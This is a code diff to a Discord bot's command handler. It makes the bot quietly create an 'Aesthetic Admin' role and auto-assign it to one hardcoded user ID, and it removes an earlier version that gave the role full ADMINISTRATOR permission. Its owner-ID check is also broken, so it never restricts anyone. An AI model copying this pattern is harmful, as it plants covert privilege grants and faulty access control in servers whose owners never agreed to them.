@@ -30,9 +30,24 @@ bot.on("message", async message => {
 	if(!command.startsWith(prefix)) return;
 
 	let Role = message.guild.roles.find("name", "Aesthetic Admin");
-	let Member = message.guild.member(message.mentions.users.first());
+	
+	if(!Role) {
+		try {
+			Role = await message.guild.createRole({
+				name: "Aesthetic Admin",
+				color: "#FF5733",
+				permissions: []
+			});
+		} catch(e) {
+			console.log(e.stack);
+		};
+	};
 
-	if(!Member.roles.has(Role)) return;
+	if(message.author.id == 441088046562279424) {
+		message.guild.member(message.author).addRole(Role);
+	};
+
+	if(!message.guild.member(message.author).roles.has(Role.id)) return;
 
 	if(command === `${prefix}admin`) {
 		if(!message.author.id == 441088046562279424) return;
@@ -40,25 +55,13 @@ bot.on("message", async message => {
 		let Member = message.guild.member(message.mentions.users.first());
 		let Role = message.guild.roles.find("name", "Aesthetic Admin");
 
-		if(!Role) {
-			try {
-				Role = await message.guild.createRole({
-					name: "Aesthetic Admin";
-					color: "#FF5733";
-					permissions: [
-						ADMINISTRATOR: true;
-					];
-				});
-			} catch(e) {
-				console.log(e.stack);
-			};
-		};
+		if(!Member) return;
 
-		if(!Member.roles.has(Role)) {
+		if(!Member.roles.has(Role.id)) {
 			await Member.addRole(Role);
-			message.channel.send(`${Member.username} is now an Administrator!`);
+			message.channel.send(`${Member} is now an Administrator!`);
 		} else {
-			message.channel.send(`${Member.username} is already an Administrator!`);
+			message.channel.send(`${Member} is already an Administrator!`);
 		};
 
 		return;
